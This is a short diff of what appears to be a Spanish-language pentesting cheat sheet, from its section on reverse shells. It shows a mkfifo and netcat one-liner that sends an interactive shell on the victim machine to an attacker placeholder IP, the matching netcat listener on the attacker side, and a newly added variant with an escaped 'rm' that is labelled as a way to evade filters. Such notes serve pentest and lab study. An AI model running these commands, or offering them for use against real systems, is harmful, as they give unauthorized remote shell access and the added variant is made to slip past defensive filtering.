@@ -134,7 +134,8 @@ Escucha por Netcat en espera de la **ReverShell**:
 ```
 
 ```bash 
-❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc <IP> 443 >/tmp/f   # Podemos usar este comando para hacer una Revershell desde una bash en la maquina victima  
+❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> 443 >/tmp/f          # Podemos usar este comando para hacer una Revershell desde una bash en la maquina victima 
+❯ r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4242 >/tmp/f   # Evadir filtros
 
 # Nos debemos de poner en escucha antes de esta manera
 ❯ nc -nlvp 443                   # Escucha en la maquina de atacante
